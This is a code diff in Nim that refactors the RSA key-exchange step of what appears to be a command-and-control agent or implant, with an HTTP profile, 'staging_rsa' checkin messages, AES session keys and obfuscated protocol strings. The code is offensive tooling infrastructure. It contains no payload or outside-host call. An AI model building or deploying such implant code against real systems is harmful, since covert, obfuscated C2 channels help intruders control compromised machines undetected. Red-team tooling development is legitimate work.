@@ -8,6 +8,7 @@ import ../utils/strenc
 const encryptedExchange {.used.} = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "false").toLowerAscii in ["true", "t"]
 when encryptedExchange:
   import ../utils/rsa
+  import ../utils/key_exchange
 
 type
   HttpxProfile* = ref object
@@ -216,47 +217,22 @@ proc performKeyExchange*(profile: var HttpxProfile): tuple[success: bool, newUui
     debug "[DEBUG] RSA not compiled in"
     return (true, "")
   
+  # Use shared key exchange implementation
   when encryptedExchange:
-    if not isRsaAvailable():
-      debug "[DEBUG] RSA key exchange not available: OpenSSL not found"
+    # Create a send wrapper that matches the expected signature
+    var p = profile  # Create capturable local reference
+    proc sendWrapper(data: string, uuid: string): string =
+      return p.send(data, uuid)
+    
+    let result = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
+    
+    if result.success and result.sessionKey.len > 0:
+      # Set the AES key
+      profile.setAesKey(result.sessionKey)
+      return (true, result.newUuid)
+    elif result.success:
+      # No key exchange needed (AESPSK mode)
       return (true, "")
-    debug "[DEBUG] === PERFORMING RSA KEY EXCHANGE ==="
-    try:
-      var rsaKey = generateRsaKeyPair(4096)
-      if not rsaKey.available:
-        debug "[DEBUG] RSA key generation failed"
-        return (false, "")
-      randomize()
-      var sessionId = newString(20)
-      for i in 0..19:
-        sessionId[i] = char(rand(25) + ord('a'))
-      let stagingMsg = %*{
-        obf("action"): obf("staging_rsa"),
-        obf("pub_key"): encode(rsaKey.publicKeyPem),
-        obf("session_id"): sessionId
-      }
-      let response = profile.send($stagingMsg, profile.config.uuid)
-      if response.len == 0:
-        freeRsaKeyPair(rsaKey)
-        return (false, "")
-      let respJson = parseJson(response)
-      if not respJson.hasKey(obf("session_key")) or not respJson.hasKey(obf("uuid")):
-        freeRsaKeyPair(rsaKey)
-        return (false, "")
-      let encryptedSessionKey = decode(respJson[obf("session_key")].getStr())
-      let newUuid = respJson[obf("uuid")].getStr()
-      let encryptedBytes = cast[seq[byte]](encryptedSessionKey)
-      let decryptedKey = rsaPrivateDecrypt(rsaKey, encryptedBytes)
-      if decryptedKey.len == 0:
-        freeRsaKeyPair(rsaKey)
-        return (false, "")
-      var aesKey = decryptedKey
-      if aesKey.len > 32:
-        aesKey.setLen(32)
-      profile.setAesKey(aesKey)
-      freeRsaKeyPair(rsaKey)
-      debug "[DEBUG] RSA key exchange completed successfully"
-      return (true, newUuid)
-    except:
-      debug "[DEBUG] Key exchange exception: ", getCurrentExceptionMsg()
+    else:
+      debug "[DEBUG] Key exchange failed: ", result.error
       return (false, "")
